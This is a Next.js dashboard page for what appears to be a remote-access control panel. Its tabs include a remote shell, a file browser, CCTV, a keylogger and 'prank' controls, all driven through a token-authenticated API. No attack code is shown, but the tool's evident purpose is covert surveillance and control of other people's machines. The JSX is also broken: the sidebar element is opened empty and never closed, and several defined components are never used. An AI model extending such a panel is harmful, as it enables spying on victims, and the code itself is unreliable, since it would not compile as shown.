"use client";
import { useState, useEffect, useCallback, useMemo } from "react";
import { useRouter } from "next/navigation";
import { getApiBase, getToken, clearCredentials, ping } from "@/lib/api";

import DashboardHome from "@/components/tabs/DashboardHome";
import ControlTab    from "@/components/tabs/ControlTab";
import FilesTab      from "@/components/tabs/FilesTab";
import TerminalTab   from "@/components/tabs/TerminalTab";
import AIChat        from "@/components/tabs/AIChat";
import CctvTab       from "@/components/tabs/CctvTab";
import KeyloggerTab  from "@/components/tabs/KeyloggerTab";
import PrankTab      from "@/components/tabs/PrankTab";
import ConfigTab     from "@/components/tabs/ConfigTab";
import LogsTab       from "@/components/tabs/LogsTab";
import VaultTab from "@/components/tabs/VaultTab";

// ── Types ──────────────────────────────────────────────────────────────────

type TabId =
  | "home" | "control" | "terminal" | "files"
  | "ai" | "cctv" | "keylogger" | "prank" | "config" | "logs" | "vault";

interface NavItem {
  id:        TabId;
  icon:      string;
  label:     string;
  component: React.ComponentType;
}

// ── Nav config ─────────────────────────────────────────────────────────────

const NAV_ITEMS: NavItem[] = [
  { id: "home",      icon: "🏠", label: "Dashboard",   component: DashboardHome },
  { id: "control",   icon: "🎮", label: "Control",     component: ControlTab   },
  { id: "terminal",  icon: "💻", label: "Shell",       component: TerminalTab  },
  { id: "files",     icon: "📁", label: "Files",       component: FilesTab     },
  { id: "ai",        icon: "🧠", label: "AI Chat",     component: AIChat       },
  { id: "cctv",      icon: "📹", label: "CCTV",        component: CctvTab      },
  { id: "keylogger", icon: "⌨️", label: "Keylogger",   component: KeyloggerTab },
  { id: "prank",     icon: "🎭", label: "Prank",       component: PrankTab     },
  { id: "config",    icon: "⚙️", label: "Config",      component: ConfigTab    },
  { id: "logs",      icon: "📋", label: "Logs",        component: LogsTab      },
// { id: "vault", icon: "🔐", label: "Vault", component: VaultTab },
];

// ── Helpers ────────────────────────────────────────────────────────────────

function useWindowWidth() {
  const [w, setW] = useState(0);
  useEffect(() => {
    const update = () => setW(window.innerWidth);
    update();
    window.addEventListener("resize", update);
    return () => window.removeEventListener("resize", update);
  }, []);
  return w;
}

// ── Sub-components ─────────────────────────────────────────────────────────

function StatusDot({ online }: { online: boolean | null }) {
  const color =
    online === null ? "#f59e0b" :
    online          ? "#10b981" :
                      "#ef4444";
  return (
    <span style={{ position: "relative", display: "inline-flex", width: 10, height: 10, flexShrink: 0 }}>
      <span style={{
        position: "absolute", inset: 0, borderRadius: "50%",
        background: color,
      }} />
      {online && (
        <span style={{
          position: "absolute", inset: 0, borderRadius: "50%",
          background: color, opacity: 0.35,
          animation: "pg-ping 2s cubic-bezier(0,0,0.2,1) infinite",
        }} />
      )}
    </span>
  );
}

function NavButton({
  item, active, collapsed, onClick,
}: {
  item: NavItem; active: boolean; collapsed: boolean; onClick: () => void;
}) {
  const [hov, setHov] = useState(false);
  return (
    <button
      onClick={onClick}
      onMouseEnter={() => setHov(true)}
      onMouseLeave={() => setHov(false)}
      title={collapsed ? item.label : undefined}
      style={{
        width: "100%", border: "none", textAlign: "left",
        padding: collapsed ? "10px 0" : "10px 14px",
        borderRadius: 10,
        display: "flex", alignItems: "center",
        justifyContent: collapsed ? "center" : "flex-start",
        gap: collapsed ? 0 : 12,
        cursor: "pointer",
        transition: "all 0.18s",
        background: active
          ? "rgba(0,212,255,0.12)"
          : hov
            ? "rgba(255,255,255,0.05)"
            : "transparent",
        color: active ? "#00d4ff" : "rgba(226,232,240,0.65)",
        borderLeft: active ? "2px solid #00d4ff" : "2px solid transparent",
        fontFamily: "inherit",
      }}
    >
      <span style={{ fontSize: "1.15rem", flexShrink: 0 }}>{item.icon}</span>
      {!collapsed && (
        <span style={{
          fontSize: "0.88rem", fontWeight: active ? 600 : 400,
          whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis",
          animation: "pg-fadein 0.2s ease both",
        }}>
          {item.label}
        </span>
      )}
    </button>
  );
}

// ── Page ───────────────────────────────────────────────────────────────────

export default function DashboardPage() {
  const router   = useRouter();
  const winW     = useWindowWidth();
  // winW === 0 saat SSR / sebelum hydration — treat as desktop agar tidak flicker
  // Setelah mount, nilai aktual akan dipakai
  const isMobile = winW > 0 && winW < 768;
  const isTablet = winW >= 768 && winW < 1024;

  const [activeTab,      setActiveTab]      = useState<TabId>("home");
  const [online,         setOnline]         = useState<boolean | null>(null);
  const [sidebarOpen,    setSidebarOpen]    = useState(true);
  const [mobileDrawer,   setMobileDrawer]   = useState(false);
  const [time,           setTime]           = useState(new Date());

  // Sidebar is collapsed (icon-only) when not fully open on desktop
  const collapsed = !isMobile && !sidebarOpen;

  // ── Auth guard ──────────────────────────────────────────────────────────
  useEffect(() => {
    if (!getApiBase() || !getToken()) router.replace("/");
  }, [router]);

  // ── Responsive sidebar defaults ─────────────────────────────────────────
  useEffect(() => {
    if (winW === 0) return;
    if (winW < 768) {
      // Mobile: sidebar selalu jadi drawer, pastikan tertutup saat pertama load
      setSidebarOpen(false);
      setMobileDrawer(false);
    } else if (winW < 1024) {
      setSidebarOpen(false);
      setMobileDrawer(false);
    } else {
      setSidebarOpen(true);
    }
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [winW === 0, winW < 768, winW < 1024]); // react to breakpoint crossing only

  // ── Clock ───────────────────────────────────────────────────────────────
  useEffect(() => {
    const t = setInterval(() => setTime(new Date()), 1000);
    return () => clearInterval(t);
  }, []);

  // ── Ping ────────────────────────────────────────────────────────────────
  const checkOnline = useCallback(async () => {
    try   { await ping(); setOnline(true);  }
    catch { setOnline(false); }
  }, []);

  useEffect(() => {
    checkOnline();
    const iv = setInterval(checkOnline, 15_000);
    return () => clearInterval(iv);
  }, [checkOnline]);

  // ── Logout ──────────────────────────────────────────────────────────────
  const handleLogout = () => { clearCredentials(); router.replace("/"); };

  // ── Active component ────────────────────────────────────────────────────
  const ActiveComponent = useMemo(
    () => NAV_ITEMS.find(n => n.id === activeTab)?.component ?? DashboardHome,
    [activeTab],
  );

  const activeItem = NAV_ITEMS.find(n => n.id === activeTab)!;

  // ── Nav click ───────────────────────────────────────────────────────────
  const handleNav = (id: TabId) => {
    setActiveTab(id);
    if (isMobile) setMobileDrawer(false);
  };

  // ── Sidebar width ───────────────────────────────────────────────────────
  const sidebarW = isMobile ? 0 : collapsed ? 64 : 240;

  // ─────────────────────────────────────────────────────────────────────────

  return (
    <>
      {/* Global keyframes */}
      <style>{`
        @keyframes pg-ping    { 75%,100%{transform:scale(2.2);opacity:0;} }
        @keyframes pg-fadein  { from{opacity:0;transform:translateX(-6px);}to{opacity:1;transform:none;} }
        @keyframes pg-slidein { from{opacity:0;transform:translateX(-100%);}to{opacity:1;transform:none;} }
        @keyframes pg-content { from{opacity:0;transform:translateY(8px);}to{opacity:1;transform:none;} }
        * { box-sizing: border-box; }
        ::-webkit-scrollbar        { width:5px; height:5px; }
        ::-webkit-scrollbar-track  { background:transparent; }
        ::-webkit-scrollbar-thumb  { background:rgba(0,212,255,0.2); border-radius:3px; }
        ::-webkit-scrollbar-thumb:hover { background:rgba(0,212,255,0.4); }
      `}</style>

      <div style={{
        display: "flex", minHeight: "100vh",
        background: "var(--jarvis-bg, #050a18)",
        color: "#e2e8f0", fontFamily: "'Segoe UI', system-ui, sans-serif",
        position: "relative",
        // ❌ overflow: "hidden" dihapus — memblokir position:fixed sidebar di mobile
      }}>

        {/* ── Mobile drawer backdrop ──────────────────────────────────── */}
        {mobileDrawer && (
          <div
            onClick={() => setMobileDrawer(false)}
            style={{
              position: "fixed", inset: 0,
              zIndex: 120,  // di bawah sidebar (130) tapi di atas konten (80)
              background: "rgba(0,0,0,0.6)",
              backdropFilter: "blur(4px)",
              // Hanya tampil di mobile — di desktop tidak perlu
              display: isMobile ? "block" : "none",
            }}
          />
        )}

        {/* ══════════════════════════════════════════════════════════════
            SIDEBAR
        ══════════════════════════════════════════════════════════════ */}
        <aside style={{
          width:      isMobile ? 260 : sidebarW,
          minHeight:  "100vh",
          flexShrink: 0,
          display:    "flex", flexDirection: "column",
          background: "rgba(8,12,26,0.98)",
          borderRight: "1px solid rgba(0,212,255,0.12)",
          backdropFilter: "blur(20px)",
          overflowX:  "hidden", overflowY: "auto",
          // transition berbeda untuk mobile vs desktop — tidak duplikat
          transition: isMobile
            ? "transform 0.28s cubic-bezier(.4,0,.2,1)"
            : "width 0.28s cubic-bezier(.4,0,.2,1)",
          ...(isMobile ? {
            position:  "fixed" as const,
            top:       0,
            left:      0,
            height:    "100vh",
            zIndex:    130,
            width:     260,
            transform: mobileDrawer ? "translateX(0)" : "translateX(-100%)",
            boxShadow: mobileDrawer ? "4px 0 32px rgba(0,0,0,0.6)" : "none",
          } : {
            position: "sticky" as const,
            top:      0,
            height:   "100vh",
          }),
        }}>

        {/* ══════════════════════════════════════════════════════════════
            MAIN
        ══════════════════════════════════════════════════════════════ */}
        <main style={{
          flex: 1, display: "flex", flexDirection: "column",
          minWidth: 0, minHeight: "100vh",
        }}>

          {/* Header */}
          <header style={{
            padding: "0 20px",
            height: 58,
            flexShrink: 0,
            borderBottom: "1px solid rgba(0,212,255,0.1)",
            background: "rgba(8,12,26,0.88)",
            backdropFilter: "blur(16px)",
            display: "flex", alignItems: "center", justifyContent: "space-between",
            position: "sticky", top: 0, zIndex: 80,
            gap: 12,
          }}>

            {/* Left: hamburger (mobile+tablet < 1024px) + page title */}
            <div style={{ display: "flex", alignItems: "center", gap: 14, minWidth: 0 }}>
              {winW > 0 && winW < 1024 && (
                <button
                  onClick={() => setMobileDrawer(v => !v)}
                  aria-label="Toggle menu"
                  style={{
                    background: mobileDrawer ? "rgba(0,212,255,0.1)" : "none",
                    border: mobileDrawer ? "1px solid rgba(0,212,255,0.2)" : "none",
                    borderRadius: 6,
                    color: "#00d4ff", fontSize: "1.4rem",
                    cursor: "pointer", flexShrink: 0,
                    display: "flex", alignItems: "center",
                    padding: "2px 6px", lineHeight: 1,
                  }}
                >☰</button>
              )}
              <h1 style={{
                display: "flex", alignItems: "center", gap: 10,
                fontSize: "0.98rem", fontWeight: 700, color: "#e2e8f0",
                margin: 0, minWidth: 0,
              }}>
                <span style={{ fontSize: "1.2rem", flexShrink: 0 }}>{activeItem.icon}</span>
                <span style={{
                  whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis",
                  display: winW < 400 ? "none" : "inline",
                }}>
                  {activeItem.label}
                </span>
              </h1>
            </div>

            {/* Right: status badge + clock */}
            <div style={{ display: "flex", alignItems: "center", gap: 10, flexShrink: 0 }}>
              <div style={{
                display: "flex", alignItems: "center", gap: 7,
                padding: "5px 11px", borderRadius: 20,
                background: online ? "rgba(16,185,129,0.1)" : "rgba(239,68,68,0.1)",
                border: `1px solid ${online ? "rgba(16,185,129,0.2)" : "rgba(239,68,68,0.2)"}`,
              }}>
                <div style={{
                  width: 6, height: 6, borderRadius: "50%",
                  background: online ? "#10b981" : "#ef4444",
                  flexShrink: 0,
                }} />
                <span style={{
                  fontSize: "0.72rem", fontWeight: 700, letterSpacing: "0.06em",
                  color: online ? "#10b981" : "#ef4444",
                  display: winW < 480 ? "none" : "inline",
                }}>
                  {online ? "ONLINE" : "OFFLINE"}
                </span>
              </div>

              {winW >= 560 && (
                <span style={{
                  fontSize: "0.78rem", color: "rgba(226,232,240,0.45)",
                  fontFamily: "'JetBrains Mono', 'Courier New', monospace",
                  background: "rgba(0,0,0,0.3)", padding: "4px 10px", borderRadius: 6,
                  letterSpacing: "0.04em",
                }}>
                  {time.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit", second: "2-digit" })}
                </span>
              )}
            </div>
          </header>

          {/* Content */}
          <div style={{
            flex: 1,
            padding: winW < 640 ? "16px" : "24px",
            overflowY: "auto", overflowX: "hidden",
          }}>
            <div style={{
              maxWidth: 1400, margin: "0 auto",
              animation: "pg-content 0.3s ease both",
            }} key={activeTab}>
              <ActiveComponent />
            </div>
          </div>
        </main>
      </div>
    </>
  );
}